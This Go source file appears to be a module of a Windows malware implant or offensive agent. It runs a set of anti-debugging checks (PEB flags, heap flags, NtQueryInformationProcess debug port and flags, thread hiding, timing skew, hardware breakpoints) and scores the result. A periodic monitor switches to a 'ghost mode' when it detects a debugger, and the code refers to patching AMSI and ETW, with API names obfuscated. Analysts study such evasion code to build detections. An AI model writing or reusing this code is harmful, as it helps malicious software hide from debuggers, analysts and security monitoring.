//go:build windows
// +build windows

package main

import (
	"syscall"
	"time"
	"unsafe"
)

var (
	antidebugNtdll = syscall.NewLazyDLL("ntdll.dll")
)

type antidebugProcessBasicInfo struct {
	exitStatus                   uintptr
	pebBaseAddress               uintptr
	affinityMask                 uintptr
	basePriority                 uintptr
	uniqueProcessID              uintptr
	inheritedFromUniqueProcessID uintptr
}

const (
	antidebugProcessDebugPort       = 0x7
	antidebugProcessDebugFlags      = 0x1F
	antidebugThreadHideFromDebugger = 0x11
	antidebugCONTEXTDebugRegisters  = 0x00000010
	antidebugTHREADGetContext       = 0x0008
)

func antidebugGetPEB() uintptr {
	procNtQueryInfoProcess := antidebugNtdll.NewProc(s(SProcNtQIP))
	var pbi antidebugProcessBasicInfo
	ret, _, _ := procNtQueryInfoProcess.Call(
		^uintptr(0),
		0,
		uintptr(unsafe.Pointer(&pbi)),
		uintptr(unsafe.Sizeof(pbi)),
		0,
	)
	if ret != 0 || pbi.pebBaseAddress == 0 {
		return 0
	}
	return pbi.pebBaseAddress
}

func checkPEBBeingDebugged() bool {
	peb := antidebugGetPEB()
	if peb == 0 {
		return false
	}
	// PEB offset 0x02: BeingDebugged flag (set by kernel when debugger attached)
	beingDebugged := *(*byte)(unsafe.Pointer(peb + 0x02))
	return beingDebugged != 0
}

func checkNtGlobalFlag() bool {
	peb := antidebugGetPEB()
	if peb == 0 {
		return false
	}
	// PEB offset 0xBC: NtGlobalFlag — debug flags set by loader when debugging
	flags := *(*uint32)(unsafe.Pointer(peb + 0xBC))
	return flags&0x70 != 0
}

func checkHeapFlags() bool {
	peb := antidebugGetPEB()
	if peb == 0 {
		return false
	}
	// PEB offset 0x10: pointer to ProcessHeap (PEB64 layout)
	heapPtr := *(*uintptr)(unsafe.Pointer(peb + 0x10))
	if heapPtr == 0 {
		return false
	}
	// Heap offset 0x74: ForceFlags — non-zero when debugging
	forceFlags := *(*uint32)(unsafe.Pointer(heapPtr + 0x74))
	if forceFlags != 0 {
		return true
	}
	// Heap offset 0x70: Flags — abnormal flags indicate debug heap usage
	flags := *(*uint32)(unsafe.Pointer(heapPtr + 0x70))
	return flags != 0x08000000 && flags != 0x08001000 && flags != 0x08002000
}

func checkNtQueryInfoProcessDebugPort() bool {
	procNtQueryInfoProcess := antidebugNtdll.NewProc(s(SProcNtQIP))
	var debugPort uint32
	ret, _, _ := procNtQueryInfoProcess.Call(
		^uintptr(0),
		uintptr(antidebugProcessDebugPort),
		uintptr(unsafe.Pointer(&debugPort)),
		uintptr(unsafe.Sizeof(debugPort)),
		0,
	)
	if ret != 0 {
		return false
	}
	return debugPort != 0
}

func checkNtQueryInfoProcessFlags() bool {
	procNtQueryInfoProcess := antidebugNtdll.NewProc(s(SProcNtQIP))
	var debugFlags uint32
	ret, _, _ := procNtQueryInfoProcess.Call(
		^uintptr(0),
		uintptr(antidebugProcessDebugFlags),
		uintptr(unsafe.Pointer(&debugFlags)),
		uintptr(unsafe.Sizeof(debugFlags)),
		0,
	)
	if ret != 0 {
		return false
	}
	return debugFlags == 0
}

func checkNtSetInfoThread() bool {
	procNtSetInfoThread := antidebugNtdll.NewProc(s(SProcNtSIT))
	procGetCurrentThread := k32.NewProc(s(SProcGCThread))
	hThread, _, _ := procGetCurrentThread.Call()
	ret, _, _ := procNtSetInfoThread.Call(
		hThread,
		uintptr(antidebugThreadHideFromDebugger),
		0,
		0,
	)
	return ret != 0
}

func checkCloseHandleNt() bool {
	procNtClose := antidebugNtdll.NewProc(s(SProcNtC))
	ret, _, _ := procNtClose.Call(uintptr(0xDEADBEEF))
	return ret == 0
}

func checkRDTSCTiming() bool {
	const expected = 100 * time.Millisecond
	start := time.Now()
	time.Sleep(expected)
	elapsed := time.Since(start)
	threshold := expected * 2
	if elapsed > threshold {
		return true
	}
	if elapsed < expected/2 {
		return true
	}
	return false
}

func checkSleepSkew() bool {
	suspicious := 0
	for i := 0; i < 3; i++ {
		const expected = 50 * time.Millisecond
		start := time.Now()
		time.Sleep(expected)
		elapsed := time.Since(start)
		ratio := float64(elapsed) / float64(expected)
		if ratio > 2.0 || ratio < 0.5 {
			suspicious++
		}
	}
	return suspicious >= 2
}

func checkHardwareBreakpoints() bool {
	procGetCurrentThreadId := k32.NewProc(s(SProcGCTId))
	procOpenThread := k32.NewProc(s(SProcOThread))
	tid, _, _ := procGetCurrentThreadId.Call()
	hThread, _, _ := procOpenThread.Call(
		uintptr(antidebugTHREADGetContext),
		0,
		tid,
	)
	if hThread == 0 {
		return false
	}
	defer procCloseHandle.Call(hThread)

	var ctx threadContext
	ctx.contextFlags = antidebugCONTEXTDebugRegisters
	ret, _, _ := procGetThreadContext.Call(hThread, uintptr(unsafe.Pointer(&ctx)))
	if ret == 0 {
		return false
	}
	return ctx.dr0 != 0 || ctx.dr1 != 0 || ctx.dr2 != 0 || ctx.dr3 != 0
}

func AntiDebugCheck() (score int32, details map[string]bool) {
	details = make(map[string]bool)

	weights := map[string]int{
		"peb_being_debugged":   15,
		"nt_global_flag":       10,
		"heap_flags":           10,
		"debug_port":           15,
		"debug_flags":          10,
		"hide_thread":          5,
		"invalid_close":        5,
		"sleep_timing":         10,
		"sleep_skew":           10,
		"hardware_breakpoints": 10,
	}

	checks := map[string]func() bool{
		"peb_being_debugged":   checkPEBBeingDebugged,
		"nt_global_flag":       checkNtGlobalFlag,
		"heap_flags":           checkHeapFlags,
		"debug_port":           checkNtQueryInfoProcessDebugPort,
		"debug_flags":          checkNtQueryInfoProcessFlags,
		"hide_thread":          checkNtSetInfoThread,
		"invalid_close":        checkCloseHandleNt,
		"sleep_timing":         checkRDTSCTiming,
		"sleep_skew":           checkSleepSkew,
		"hardware_breakpoints": checkHardwareBreakpoints,
	}

	var totalScore int32
	for name, check := range checks {
		func() {
			defer func() {
				if r := recover(); r != nil {
					details[name] = true
					if w, ok := weights[name]; ok {
						totalScore += int32(w)
					}
				}
			}()
			result := check()
			details[name] = result
			if result {
				if w, ok := weights[name]; ok {
					totalScore += int32(w)
				}
			}
		}()
	}

	if totalScore > 100 {
		totalScore = 100
	}
	if totalScore < 0 {
		totalScore = 0
	}

	return totalScore, details
}

func runAntiDebugMonitor() {
	intervals := []time.Duration{
		30 * time.Second, 30 * time.Second, 30 * time.Second,
		30 * time.Second, 30 * time.Second, 30 * time.Second,
		30 * time.Second, 30 * time.Second, 30 * time.Second,
		30 * time.Second,
		5 * time.Minute,
	}
	for _, interval := range intervals {
		if isInGhostMode() {
			return
		}
		time.Sleep(interval)
		score, details := AntiDebugCheck()
		if score > 50 {
			logDebugf("[antidebug] Periodic check: score=%d, entering ghost mode", score)
			enterGhostMode("anti-debug periodic detection")
			return
		}
		if score > 20 {
			patchAMSI = false
			patchETW = false
		}
		_ = details
	}
}
